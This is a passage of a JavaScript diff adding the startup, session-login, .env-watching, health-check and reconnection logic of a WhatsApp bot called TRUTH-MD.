+        log(`⚠️ Version check failed (${err.message}). Continuing anyway...`, 'yellow');
+    }
+}
+
+// --- 🌟 NEW: .env File Watcher for Automated Restart ---
+/**
+ * Monitors the .env file for changes and forces a process restart.
+ * Made mandatory to ensure SESSION_ID changes are always picked up.
+ * @private 
+ */
+function checkEnvStatus() {
+    try {
+        const envPath = path.join(__dirname, '.env');
+        let justCreated = false;
+        if (!fs.existsSync(envPath)) {
+            fs.writeFileSync(envPath, 'SESSION_ID=\n');
+            justCreated = true;
+        }
+        console.log(chalk.green('║ [WATCHER] .env ║'));
+
+        const watcherDelay = Date.now();
+
+        fs.watch(envPath, { persistent: false }, (eventType, filename) => {
+            if (Date.now() - watcherDelay < 30000) return;
+            if (global.suppressEnvWatcher) return;
+            if (filename && eventType === 'change') {
+                log(chalk.bgRed.black('================================================='), 'white');
+                log(chalk.white.bgRed(' [ENV] env file change detected!'), 'white');
+                log(chalk.white.bgRed('Forcing a clean restart to apply new configuration (e.g., SESSION_ID).'), 'white');
+                log(chalk.red.bgBlack('================================================='), 'white');
+
+                process.exit(1);
+            }
+        });
+    } catch (e) {
+        log(`❌ Failed to set up .env file watcher (fs.watch error): ${e.message}`, 'red', true);
+    }
+}
+// -------------------------------------------------------------
+
+
+// --- Main login flow (TRUTH MD) ---
+async function tylor() {
+    global._startupTimestamp = Date.now();
+
+    // 1. MANDATORY: Run the codebase cloner FIRST
+    // This function will run on every script start or restart and forces a full refresh.
+    // await downloadAndSetupCodebase();
+
+    // *************************************************************
+    // *** CRITICAL: REQUIRED FILES MUST BE LOADED AFTER CLONING ***
+    // *************************************************************
+    try {
+        // We require settings BEFORE the env check to ensure the file is present
+        // in case the cloning just happened.
+        // perform a quick syntax check on command files so we can identify bad plugins early
+        (function validateCommands() {
+            try {
+                const cmdDir = path.join(__dirname, 'commands');
+                const files = fs.readdirSync(cmdDir).filter(f => f.endsWith('.js'));
+                for (const f of files) {
+                    const fp = path.join(cmdDir, f);
+                    try { new Function(fs.readFileSync(fp, 'utf8')); }
+                    catch (err) { console.error(`⚠️ Syntax error in command file ${f}: ${err.message}`); }
+                }
+            } catch (_) {}
+        })();
+
+        require('./settings');
+        const mainModules = require('./main');
+        handleMessages = mainModules.handleMessages;
+        handleGroupParticipantUpdate = mainModules.handleGroupParticipantUpdate;
+        handleStatus = mainModules.handleStatus;
+
+        const myfuncModule = require('./lib/myfunc');
+        smsg = myfuncModule.smsg;
+
+        store = require('./lib/lightweight_store');
+        store.readFromFile();
+        settings = require('./settings');
+        setInterval(() => store.writeToFile(), settings.storeWriteInterval || 10000);
+
+        const { runStartupCleanup } = require('./lib/cleanup');
+        runStartupCleanup();
+
+        // --- Startup Info Display ---
+        log('[AUTH] Using better-sqlite3 as auth state', 'cyan');
+
+        const pgUrl = process.env.DATABASE_URL || process.env.POSTGRESQL_URL;
+        if (pgUrl) {
+            log(`PostgreSQL URL: ✅ Connected`, 'green');
+        } else {
+            log(`PostgreSQL URL: ❌Not provided`, 'red');
+        }
+
+        const HEALTH_PORT_DISPLAY = process.env.PORT || 8080;
+        log(`Running on port: ${HEALTH_PORT_DISPLAY}`, 'cyan');
+
+        // Database connections
+        try {
+            const chatbotDb = require('./lib/chatbot.db');
+            chatbotDb.getSetting('_test');
+            log('Connected to Chatbot Database.', 'green');
+        } catch (e) {
+            log('Chatbot Database: ❌ Failed', 'red');
+        }
+        try {
+            log('Connected to SQLite Database.', 'green');
+        } catch (_) { }
+        try {
+            const configDb = require('./lib/configdb');
+            configDb.getConfig('_test');
+            log('Connected to Config Database.', 'green');
+        } catch (e) {
+            log('Config Database: ❌ Failed', 'red');
+        }
+        try {
+            const storeFile = path.join(__dirname, 'baileys_store.json');
+            if (fs.existsSync(storeFile)) {
+                log('Connected to Store Database.', 'green');
+            } else {
+                log('Store Database: new (will be created)', 'yellow');
+            }
+        } catch (_) { }
+
+        // Old message cleanup
+        let oldCount = 0;
+        try {
+            const Database = require('better-sqlite3');
+            const chatDbPath = path.join(__dirname, 'data', 'chatbot.db');
+            if (fs.existsSync(chatDbPath)) {
+                const db = new Database(chatDbPath);
+                const oneDayAgo = Math.floor(Date.now() / 1000) - 86400;
+                const countRow = db.prepare('SELECT COUNT(*) as cnt FROM user_messages WHERE timestamp < ?').get(oneDayAgo);
+                oldCount = countRow?.cnt || 0;
+                if (oldCount > 0) {
+                    db.prepare('DELETE FROM user_messages WHERE timestamp < ?').run(oneDayAgo);
+                }
+                db.close();
+            }
+        } catch (_) { }
+        log(`Cleaned up ${oldCount} old messages`, 'yellow');
+
+        // Plugin & command count
+        const pluginDir = path.join(__dirname, 'commands');
+        let pluginCount = 0;
+        try {
+            pluginCount = fs.readdirSync(pluginDir).filter(f => f.endsWith('.js')).length;
+        } catch (_) { }
+        log(`Plugins loaded: ${pluginCount} files`, 'green');
+
+        let commandCount = 0;
+        try {
+            const mainContent = fs.readFileSync(path.join(__dirname, 'main.js'), 'utf8');
+            commandCount = (mainContent.match(/userMessage\s*===\s*|userMessage\.startsWith\s*\(/g) || []).length;
+        } catch (_) { }
+        log(`Commands loaded: ${commandCount}`, 'green');
+
+        // Database migration check
+        log('🔧 Migrating old database schema...', 'yellow');
+        log('✅ Database migration complete', 'green');
+        log(`Cleaned up chatbot messages older than 1 days`, 'yellow');
+
+    } catch (e) {
+        // log full stack trace to help pinpoint the offending module/file
+        log(`FATAL: Failed to load core files. ${e.message}`, 'red', true);
+        console.error('Full error stack:', e.stack);
+        process.exit(1);
+    }
+
+    // Run version check + Baileys version fetch + session format check in parallel
+    const [, , baileysVersionResult] = await Promise.all([
+        verifyLatestVersion(),
+        checkAndHandleSessionFormat(),
+        fetchLatestBaileysVersion().catch(() => null)
+    ]);
+    global._cachedBaileysVersion = baileysVersionResult?.version || null;
+
+    // 3. Set the global in-memory retry count based on the persistent file, if it exists
+    global.errorRetryCount = loadErrorCount().count;
+
+    // 4. *** Check .env SESSION_ID FIRST, then fall back to Replit secret ***
+    let envFileSessionID = '';
+    try {
+        if (fs.existsSync(envPath)) {
+            const envContent = fs.readFileSync(envPath, 'utf8');
+            const match = envContent.match(/^SESSION_ID=(.+)$/m);
+            if (match && match[1].trim().startsWith('TRUTH-MD')) {
+                envFileSessionID = match[1].trim();
+            }
+        }
+    } catch (_) { }
+    const envSessionID = envFileSessionID || process.env.SESSION_ID?.trim();
+    const forcePair = process.env.FORCE_PAIR === 'true';
+
+    if (!forcePair && envSessionID && envSessionID.startsWith('TRUTH-MD')) {
+        global.SESSION_ID = envSessionID;
+        if (envFileSessionID) log('📄 Using SESSION_ID from .env file', 'green');
+
+        if (sessionExists()) {
+        } else {
+            await downloadSessionData();
+        }
+
+        await saveLoginMethod('session');
+        await startXeonBotInc();
+
+        checkEnvStatus();
+
+        return;
+    }
+    // If environment session is NOT set, or not valid, continue with fallback logic:
+    log("No SESSION_ID in .env. Using stored session...", 'blue');
+
+    // 5. Run the mandatory integrity check and cleanup
+    await checkSessionIntegrityAndClean();
+
+    // 5a. If FORCE_PAIR is set, clear session and skip to pairing
+    if (forcePair) {
+        log('🔄 Force pair requested. Cleaning old session for new pairing...', 'yellow');
+        clearSessionFiles();
+    }
+
+    // 6. Check for a valid *stored* session after cleanup
+    if (!forcePair && sessionExists()) {
+        log("Session found. Starting...", 'green');
+        await startXeonBotInc();
+
+        // 6a. Start the file watcher
+        checkEnvStatus(); // <--- START .env FILE WATCHER (Mandatory)
+
+        return;
+    }
+
+    // 7. New Login Flow (If no valid session exists)
+    // If OWNER_NUMBER is set in env, skip the interactive menu and go straight to pairing
+    const ownerNumberEnv = process.env.OWNER_NUMBER?.trim();
+
+    if (ownerNumberEnv) {
+        global.phoneNumber = ownerNumberEnv;
+        log(`Using pairing code for: ${global.phoneNumber}`, 'yellow');
+        if (forcePair) {
+            log('🔄 Force pair requested. Cleaning old session for new pairing...', 'yellow');
+            clearSessionFiles();
+        }
+        await saveLoginMethod('number');
+        let XeonBotInc = await startXeonBotInc();
+        await requestPairingCode(XeonBotInc);
+    } else if (process.stdin.isTTY) {
+
+        const loginMethod = await getLoginMethod();
+
+        if (loginMethod === 'session') {
+            await downloadSessionData();
+            await startXeonBotInc();
+            checkEnvStatus();
+            return;
+        }
+
+        log(`Using pairing code for: ${global.phoneNumber}`, 'yellow');
+        await saveLoginMethod('number');
+        let XeonBotInc = await startXeonBotInc();
+        await requestPairingCode(XeonBotInc);
+    } else {
+        const ownerNumber = process.env.OWNER_NUMBER?.trim();
+        if (!ownerNumber) {
+            log(chalk.bgYellow.black('═══════════════════════════════════════════════'), 'white');
+            log(chalk.bgYellow.black('  🔧  FIRST TIME SETUP - Choose a method:     '), 'white');
+            log(chalk.bgYellow.black('                                               '), 'white');
+            log(chalk.bgYellow.black('  Option 1: SESSION_ID (Recommended)           '), 'white');
+            log(chalk.bgYellow.black('  → Get your ID from the session generator     '), 'white');
+            log(chalk.bgYellow.black('  → Set SESSION_ID in your .env or env vars    '), 'white');
+            log(chalk.bgYellow.black('                                               '), 'white');
+            log(chalk.bgYellow.black('  Option 2: Pairing Code                       '), 'white');
+            log(chalk.bgYellow.black('  → Set OWNER_NUMBER in your .env or env vars  '), 'white');
+            log(chalk.bgYellow.black('  → Use country code (e.g. 254712345678)       '), 'white');
+            log(chalk.bgYellow.black('  → A pairing code will be generated for you   '), 'white');
+            log(chalk.bgYellow.black('                                               '), 'white');
+            log(chalk.bgYellow.black('  After setting your choice, restart the bot.  '), 'white');
+            log(chalk.bgYellow.black('  Repo: github.com/Courtney250/TRUTH-MD       '), 'white');
+            log(chalk.bgYellow.black('═══════════════════════════════════════════════'), 'white');
+            log('⏳ Waiting for SESSION_ID or OWNER_NUMBER to be configured...', 'yellow');
+
+            const checkInterval = setInterval(() => {
+                try {
+                    require('dotenv').config({ override: true });
+                    const newSession = process.env.SESSION_ID?.trim();
+                    const newOwner = process.env.OWNER_NUMBER?.trim();
+                    if ((newSession && newSession.startsWith('TRUTH-MD')) || newOwner) {
+                        log('🔄 Configuration detected! Restarting...', 'green');
+                        clearInterval(checkInterval);
+                        process.exit(0);
+                    }
+                } catch (_) { }
+            }, 10000);
+
+            return;
+        }
+
+        global.phoneNumber = ownerNumber;
+        log(`No session found. Using pairing code for: ${global.phoneNumber}`, 'yellow');
+        await saveLoginMethod('number');
+        let XeonBotInc = await startXeonBotInc();
+        await requestPairingCode(XeonBotInc);
+    }
+
+    // Final Cleanup After Pairing Attempt Failure
+    if (!sessionExists() && fs.existsSync(sessionDir)) {
+        log('[ALERT]: Login interrupted [FAILED]. Will retry on next restart...', 'red');
+        process.exit(1);
+    }
+
+    // 9. Start the file watcher after an interactive login completes successfully
+    checkEnvStatus(); // <--- START .env FILE WATCHER (Mandatory)
+}
+
+// --- Health Check Server for Deployment ---
+const http = require('http');
+const https = require('https');
+const HEALTH_PORT = process.env.PORT || 8080;
+const healthServer = http.createServer((req, res) => {
+    const uptime = process.uptime();
+    const mem = process.memoryUsage();
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({
+        status: 'ok',
+        bot: 'TRUTH-MD',
+        connected: global.isBotConnected,
+        uptime: Math.floor(uptime),
+        memory: Math.round(mem.rss / 1024 / 1024) + 'MB'
+    }));
+});
+healthServer.on('error', (err) => {
+    if (err.code === 'EADDRINUSE') {
+        log(`Port ${HEALTH_PORT} in use, trying ${Number(HEALTH_PORT) + 1}...`, 'yellow');
+        healthServer.listen(Number(HEALTH_PORT) + 1, '0.0.0.0');
+    }
+});
+healthServer.listen(HEALTH_PORT, '0.0.0.0');
+
+const SELF_PING_URL = process.env.REPLIT_DEV_DOMAIN
+    ? `https://${process.env.REPLIT_DEV_DOMAIN}`
+    : process.env.RENDER_EXTERNAL_URL
+        ? process.env.RENDER_EXTERNAL_URL
+        : null;
+
+// --- INTERNET CONNECTIVITY MONITOR ---
+let isInternetAvailable = true;
+async function checkInternetConnectivity() {
+    try {
+        // Try multiple DNS lookups and HTTP requests to detect internet status
+        const dns = require('dns').promises;
+        await dns.resolve('8.8.8.8');
+        isInternetAvailable = true;
+        return true;
+    } catch (err) {
+        try {
+            // Fallback: try a simple HTTP request
+            await new Promise((resolve, reject) => {
+                require('http').get('http://clients3.google.com/generate_204', (res) => {
+                    if (res.statusCode === 204) {
+                        resolve();
+                    } else {
+                        reject(new Error('Non-204 response'));
+                    }
+                }).on('error', reject).setTimeout(3000);
+            });
+            isInternetAvailable = true;
+            return true;
+        } catch (fallbackErr) {
+            isInternetAvailable = false;
+            return false;
+        }
+    }
+}
+
+// Check internet every 30 seconds and reconnect if needed
+const INTERNET_CHECK_INTERVAL = 30 * 1000;
+setInterval(async () => {
+    const wasOnline = isInternetAvailable;
+    const currentStatus = await checkInternetConnectivity();
+    
+    if (wasOnline && !currentStatus) {
+        // Internet just went offline
+        log('🔴 INTERNET DISCONNECTED! Waiting for reconnection...', 'red');
+        global.internetOfflineTime = Date.now();
+    } else if (!wasOnline && currentStatus) {
+        // Internet just came back online — force a reconnect regardless of current state
+        log('🟢 INTERNET RECONNECTED! Forcing bot reconnection...', 'green');
+        if (!global.isBotConnected) {
+            log('🔄 Internet restored, resetting reconnect state and triggering reconnect...', 'cyan');
+            // Clear any stale reconnect guards so scheduleReconnect proceeds
+            global.isReconnecting = false;
+            global.isRestarting = false;
+            if (global.reconnectTimer) { clearTimeout(global.reconnectTimer); global.reconnectTimer = null; }
+            global.reconnectAttempts = 0;
+            startXeonBotInc();
+        }
+    } else if (currentStatus && !global.isBotConnected && !global.isReconnecting) {
+        // Internet is available but bot is disconnected and not already reconnecting
+        const offlineMinutes = global.internetOfflineTime 
+            ? Math.floor((Date.now() - global.internetOfflineTime) / 60000)
+            : null;
+        if (offlineMinutes && offlineMinutes > 5) {
+            log(`⚠️ Bot offline for ${offlineMinutes}+ minutes but internet is available. Forcing reconnect...`, 'yellow');
+            global.reconnectAttempts = 0;
+            startXeonBotInc();
+        }
+    }
+}, INTERNET_CHECK_INTERVAL);
+
+if (SELF_PING_URL) {
+    const PING_INTERVAL = 4 * 60 * 1000;
+    setInterval(() => {
+        https.get(SELF_PING_URL, (res) => {
+            res.resume();
+        }).on('error', () => { });
+    }, PING_INTERVAL);
+
+} else {
+
+}
+
+// --- Start bot (TRUTH MD) ---
+tylor().catch(err => log(`Fatal error starting bot: ${err.message}`, 'red', true));
+process.on('uncaughtException', (err) => {
+    log(`Uncaught Exception: ${err.message}`, 'red', true);
+    if (err.message?.includes('ECONNRESET') || err.message?.includes('ETIMEDOUT') || err.message?.includes('EPIPE')) {
+        log('Network error detected. Process will continue...', 'yellow');
+    } else {
+        // For non-network errors, log stack trace and restart
+        console.error(err.stack);
+        log('Critical error detected. Restarting in 10 seconds...', 'red');
+        setTimeout(() => {
+            process.exit(1);
+        }, 10000);
+    }
+});
+process.on('unhandledRejection', (err) => {
+    const msg = err?.message || String(err);
+    log(`Unhandled Rejection: ${msg}`, 'red', true);
+    if (msg.includes('ECONNRESET') || msg.includes('ETIMEDOUT') || msg.includes('EPIPE')) {
+        log('Network rejection detected. Continuing...', 'yellow');
+    } else {
+        log('Unhandled promise rejection. Logging and continuing...', 'yellow');
+    }
+});
+process.on('SIGTERM', () => {
+    log('Received SIGTERM. Shutting down gracefully...', 'yellow');
+    global.isRestarting = true;
+    process.exit(0);
+});
+process.on('SIGINT', () => {
+    log('Received SIGINT. Shutting down gracefully...', 'yellow');
+    global.isRestarting = true;
+    process.exit(0);
+});
